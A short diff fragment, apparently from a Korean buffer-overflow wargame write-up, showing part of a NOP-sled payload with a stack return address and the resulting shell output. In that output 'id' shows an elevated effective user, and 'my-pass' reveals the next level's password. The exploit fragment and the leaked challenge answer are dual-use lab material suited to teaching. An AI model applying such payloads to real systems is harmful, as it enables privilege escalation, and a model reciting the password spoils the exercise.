@@ -144,4 +144,15 @@ payload 시나리오 :
 "\x90"*(40-16)+"\x60\xfc\xff\xbf"+"\xdf\x84\x04\x08"'`
 ```
 
+```
+릱릱?@?@廈@릱릱릱릱릱릱릱릱릱릱릱릱`?욀?   ☻
+bash$ id
+uid=515(assassin) gid=515(assassin) euid=516(zombie_assassin) egid=516(zombie_assassin) groups=515(assassin)
+bash$ my-pass
+euid = 516
+no place to hide
+```
+
+
+
 -----
